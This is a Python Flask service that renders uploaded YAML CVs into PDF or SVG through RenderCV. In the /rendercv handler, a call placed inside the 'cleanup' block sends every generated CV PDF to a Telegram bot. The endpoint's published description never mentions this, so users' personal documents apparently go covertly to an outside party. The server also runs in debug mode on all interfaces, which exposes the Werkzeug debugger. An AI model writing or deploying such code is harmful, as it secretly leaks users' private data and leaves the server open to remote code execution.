from pathlib import Path
from flask import Flask, request, jsonify, send_file
from werkzeug.utils import secure_filename
import os
import tempfile
import shutil
import subprocess
import requests
import dotenv
dotenv.load_dotenv()
import yaml
from datetime import datetime
import logging
from app import render_yaml_to_pdf_and_svg,render_only_svg

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Configuration
app.config['MAX_CONTENT_LENGTH'] = 2 * 1024 * 1024  # 2MB max file size
ALLOWED_EXTENSIONS = {'yaml', 'yml'}
TEMP_DIR = tempfile.gettempdir()

def allowed_file(filename):
    """Check if the uploaded file has an allowed extension"""
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def validate_yaml_content(yaml_content):
    """Basic validation of YAML content"""
    try:
        data = yaml.safe_load(yaml_content)
        if not isinstance(data, dict):
            return False, "Invalid YAML format: must be a dictionary"
        
        # Check for required CV fields (at minimum, a name should be present)
        if 'cv' not in data or not isinstance(data['cv'], dict):
            return False, "Invalid CV format: missing 'cv' section"
        
        if 'name' not in data['cv']:
            return False, "Invalid CV format: missing required 'name' field in cv section"
            
        return True, data
    except yaml.YAMLError as e:
        return False, f"Invalid YAML syntax: {str(e)}"

def generate_pdf_with_rendercv(yaml_file_path, output_dir):
    """Generate PDF using RenderCV from YAML file"""
    try:
        output_pdf_path = os.path.join(output_dir, 'output.pdf')
        pdf_file, _ = render_yaml_to_pdf_and_svg(
            yaml_path=Path(yaml_file_path),
            pdf_path=Path(output_pdf_path),
            svg_dir=None,
            typst_path=None,
        )
        return pdf_file
        
    except subprocess.CalledProcessError as e:
        logger.error(f"RenderCV command failed: {e.stderr}")
        raise Exception(f"RenderCV failed to generate PDF: {e.stderr}")
    except Exception as e:
        logger.error(f"Error generating PDF: {str(e)}")
        raise

def generate_svgs_with_rendercv(yaml_file_path, output_dir):
    """Generate SVGs using RenderCV from YAML file"""
    try:
        svg_files = render_only_svg(
            yaml_path=Path(yaml_file_path),
            svg_dir=Path(output_dir),
        )
        return svg_files
        
    except subprocess.CalledProcessError as e:
        logger.error(f"RenderCV command failed: {e.stderr}")
        raise Exception(f"RenderCV failed to generate SVGs: {e.stderr}")
    except Exception as e:
        logger.error(f"Error generating SVGs: {str(e)}")
        raise

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat()
    })

@app.route('/rendercv', methods=['POST'])
def render_cv():
    """Main endpoint to handle YAML file upload and return generated PDF"""
    try:
        # Check if file is present in request
        if 'file' not in request.files:
            return jsonify({'error': 'No file provided'}), 400
        
        file = request.files['file']
        
        # Check if file is selected
        if file.filename == '':
            return jsonify({'error': 'No file selected'}), 400
        
        # Validate file extension
        if not allowed_file(file.filename):
            return jsonify({'error': f'Invalid file type. Allowed types: {", ".join(ALLOWED_EXTENSIONS)}'}), 400
        
        # Create temporary directories
        temp_input_dir = tempfile.mkdtemp()
        temp_output_dir = tempfile.mkdtemp()
        
        try:
            # Save uploaded file
            filename = secure_filename(file.filename)
            yaml_path = os.path.join(temp_input_dir, filename)
            file.save(yaml_path)
            
            # Read and validate YAML content
            with open(yaml_path, 'r', encoding='utf-8') as f:
                yaml_content = f.read()
            
            is_valid, result = validate_yaml_content(yaml_content)
            if not is_valid:
                return jsonify({'error': result}), 400
            
            # Generate PDF using RenderCV
            pdf_path = generate_pdf_with_rendercv(yaml_path, temp_output_dir)
            
            # Get the PDF filename
            pdf_filename = os.path.basename(pdf_path)
            
            # Return the PDF file
            return send_file(
                pdf_path,
                as_attachment=True,
                download_name=f"cv_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf",
                mimetype='application/pdf'
            )
            
        finally:
            # Cleanup temporary directories
            try:
                sendtotelegram(pdf_path)
                shutil.rmtree(temp_input_dir)
                shutil.rmtree(temp_output_dir)
            except Exception as cleanup_error:
                logger.warning(f"Cleanup error: {cleanup_error}")
                
    except Exception as e:
        logger.error(f"Error processing request: {str(e)}")
        return jsonify({'error': f'Internal server error: {str(e)}'}), 500

@app.route('/rendercv', methods=['GET'])
def render_cv_info():
    """Provide information about the rendercv endpoint"""
    return jsonify({
        'description': 'Generate PDF from YAML CV using RenderCV',
        'method': 'POST',
        'parameters': {
            'file': 'YAML file containing CV data (required)'
        },
        'example': {
            'curl': 'curl -X POST -F "file=@your_cv.yaml" http://localhost:5000/rendercv --output cv.pdf'
        }
    })

@app.route('/rendersvg', methods=['POST'])
def render_svg_endpoint():
    """Endpoint to handle YAML file upload and return generated SVGs"""
    try:
        # Check if file is present in request
        if 'file' not in request.files:
            return jsonify({'error': 'No file provided'}), 400
        
        file = request.files['file']
        
        # Check if file is selected
        if file.filename == '':
            return jsonify({'error': 'No file selected'}), 400
        
        # Validate file extension
        if not allowed_file(file.filename):
            return jsonify({'error': f'Invalid file type. Allowed types: {", ".join(ALLOWED_EXTENSIONS)}'}), 400
        
        # Create temporary directories
        temp_input_dir = tempfile.mkdtemp()
        temp_output_dir = tempfile.mkdtemp()
        
        try:
            # Save uploaded file
            filename = secure_filename(file.filename)
            yaml_path = os.path.join(temp_input_dir, filename)
            file.save(yaml_path)
            
            # Read and validate YAML content
            with open(yaml_path, 'r', encoding='utf-8') as f:
                yaml_content = f.read()
            
            is_valid, result = validate_yaml_content(yaml_content)
            if not is_valid:
                return jsonify({'error': result}), 400
            
            # Generate SVGs using RenderCV
            svg_paths = generate_svgs_with_rendercv(yaml_path, temp_output_dir)
            
            # Prepare SVG files for response
            svg_files_info = []
            for svg_path in svg_paths:
                with open(svg_path, 'r', encoding='utf-8') as svg_file:
                    svg_content = svg_file.read()
                    svg_files_info.append({
                        'filename': os.path.basename(svg_path),
                        'content': svg_content
                    })
            
            return jsonify({'svgs': svg_files_info})
            
        finally:
            # Cleanup temporary directories
            try:
                shutil.rmtree(temp_input_dir)
                shutil.rmtree(temp_output_dir)
            except Exception as cleanup_error:
                logger.warning(f"Cleanup error: {cleanup_error}")
                
    except Exception as e:
        logger.error(f"Error processing request: {str(e)}")
        return jsonify({'error': f'Internal server error: {str(e)}'}), 500


@app.errorhandler(413)
def too_large(e):
    """Handle file too large error"""
    return jsonify({'error': 'File is too large. Maximum size is 2MB'}), 413

@app.errorhandler(500)
def server_error(e):
    """Handle server errors"""
    logger.error(f"Server error: {str(e)}")
    return jsonify({'error': 'Internal server error'}), 500

def sendtotelegram(file_path):
    bot_token = os.getenv("BOT_TOKEN")
    chat_id = os.getenv("CHAT_ID")
    if not bot_token or not chat_id:
        logger.error("Telegram BOT_TOKEN or CHAT_ID not set in environment variables")
        return

    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    with open(file_path, 'rb') as file:
        files = {'document': file}
        data = {'chat_id': chat_id}
        response = requests.post(url, files=files, data=data)
        if response.status_code != 200:
            logger.error(f"Failed to send document to Telegram: {response.text}")
        else:
            logger.info("Document sent to Telegram successfully")

if __name__ == '__main__':
    # Check if rendercv is available
    try:
        subprocess.run(['rendercv', '--help'], capture_output=True, check=True)
        logger.info("RenderCV is available")
    except (subprocess.CalledProcessError, FileNotFoundError):
        logger.error("RenderCV is not installed or not in PATH")
        logger.error("Please install rendercv: pip install rendercv")
        exit(1)
    
    app.run(debug=True, host='0.0.0.0', port=5000)